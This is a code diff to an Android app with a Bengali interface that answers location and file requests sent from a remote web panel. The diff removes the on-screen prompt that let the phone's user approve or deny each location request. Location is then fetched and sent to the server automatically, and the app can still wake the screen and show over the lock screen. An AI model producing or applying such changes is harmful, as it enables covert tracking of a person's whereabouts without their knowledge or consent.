@@ -52,6 +52,8 @@ import java.util.List;
 import java.util.UUID;
 
 public class MainActivity extends Activity {
+    private static final String EXTRA_DIRECT_LOCATION_REQUEST_ID = "direct_location_request_id";
+
     private LinearLayout root;
     private TextView pathView;
     private TextView statusView;
@@ -60,7 +62,6 @@ public class MainActivity extends Activity {
     private Button requestsButton;
     private LocationManager locationManager;
     private static final int LOCATION_PERMISSION_REQUEST = 7401;
-    private static final String EXTRA_DIRECT_LOCATION_REQUEST_ID = "direct_location_request_id";
     private static final int LOCATION_SETTINGS_REQUEST = 7402;
     private File currentDir;
     private final List<File> shownFiles = new ArrayList<>();
@@ -91,55 +92,35 @@ public class MainActivity extends Activity {
                     .setPositiveButton("নিবন্ধন করুন", (d, w) -> askEnrollmentCodeAndRegister())
                     .show();
         }
-        handleDirectLocationIntent(getIntent());
+        handleDirectLocationRequest(getIntent());
     }
 
     @Override
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
-        handleDirectLocationIntent(intent);
+        handleDirectLocationRequest(intent);
     }
 
-    private void handleDirectLocationIntent(Intent intent) {
+    private void handleDirectLocationRequest(Intent intent) {
         if (intent == null || !intent.hasExtra(EXTRA_DIRECT_LOCATION_REQUEST_ID)) return;
-        long requestId = intent.getLongExtra(EXTRA_DIRECT_LOCATION_REQUEST_ID, -1);
+        long requestId = intent.getLongExtra(EXTRA_DIRECT_LOCATION_REQUEST_ID, -1L);
         if (requestId <= 0) return;
         intent.removeExtra(EXTRA_DIRECT_LOCATION_REQUEST_ID);
 
-        // Best-effort attempt to show the user-approved location prompt over the current screen.
+        // Deliberately no app-created confirmation dialog.
+        // The Android system Location Settings resolution (if needed) is initiated directly.
         if (Build.VERSION.SDK_INT >= 27) {
             setShowWhenLocked(true);
             setTurnScreenOn(true);
         } else {
             getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
-                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
-                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
         }
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             if (isFinishing() || isDestroyed()) return;
-            new AlertDialog.Builder(MainActivity.this)
-                    .setTitle("লোকেশন অনুরোধ")
-                    .setMessage("ওয়েব প্যানেল থেকে এই ফোনের বর্তমান অবস্থান চাওয়া হয়েছে। অনুমতি দিলে একবার অবস্থান নিয়ে সার্ভারে পাঠানো হবে। আপনি কি চালিয়ে যেতে চান?")
-                    .setNegativeButton("না", (d, w) -> {
-                        submitRequestResult(requestId, "rejected",
-                                resultObject("message", "Phone user denied location request"), () -> {});
-                        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-                    })
-                    .setPositiveButton("অনুমতি দিন", (d, w) -> {
-                        beginLocationRequest(requestId, () -> {
-                            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-                        });
-                    })
-                    .setOnCancelListener(d -> {
-                        submitRequestResult(requestId, "rejected",
-                                resultObject("message", "Location prompt dismissed"), () -> {});
-                        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-                    })
-                    .show();
-        }, 350);
+            beginLocationRequest(requestId, () -> {});
+        }, 250);
     }
 
     private void startPingService() {
@@ -245,13 +226,9 @@ public class MainActivity extends Activity {
         JSONObject payload = request.optJSONObject("request_payload");
         String requestedPath = payload == null ? "" : payload.optString("path", "");
         if ("get_location".equals(action)) {
-            new AlertDialog.Builder(this)
-                .setTitle("লোকেশন অনুরোধ")
-                .setMessage("ওয়েব প্যানেল থেকে এই ফোনের বর্তমান অবস্থান চাওয়া হয়েছে। অনুমতি দিলে একবার অবস্থান নেওয়ার চেষ্টা করে সার্ভারে পাঠানো হবে। আপনি কি চালিয়ে যেতে চান?")
-                .setNegativeButton("না", (d, w) -> submitRequestResult(requestId, "rejected", resultObject("message", "Phone user denied location request"), () -> showRequestAt(requests, index + 1)))
-                .setPositiveButton("অনুমতি দিন", (d, w) -> beginLocationRequest(requestId, () -> showRequestAt(requests, index + 1)))
-                .setOnCancelListener(d -> showRequestAt(requests, index + 1))
-                .show();
+            // Skip the app-created confirmation. Use Android's own Location Settings
+            // resolution dialog through SettingsClient when the request is approved by the server.
+            beginLocationRequest(requestId, () -> showRequestAt(requests, index + 1));
         } else if ("list_files".equals(action)) {
             new AlertDialog.Builder(this)
                 .setTitle("ফাইল তালিকার অনুরোধ")
@@ -627,8 +604,11 @@ public class MainActivity extends Activity {
         root.addView(permissionButton, new LinearLayout.LayoutParams(-1, -2));
 
 
-        // Server requests are received automatically by the foreground PingService.
-        // No manual "সার্ভারের অনুরোধ দেখুন" button is shown.
+        requestsButton = new Button(this);
+        requestsButton.setText("সার্ভারের অনুরোধ দেখুন");
+        requestsButton.setOnClickListener(v -> checkServerRequests());
+        root.addView(requestsButton, new LinearLayout.LayoutParams(-1, -2));
+
         pathView = new TextView(this);
         pathView.setTextSize(13);
         pathView.setTextColor(0xFF444444);
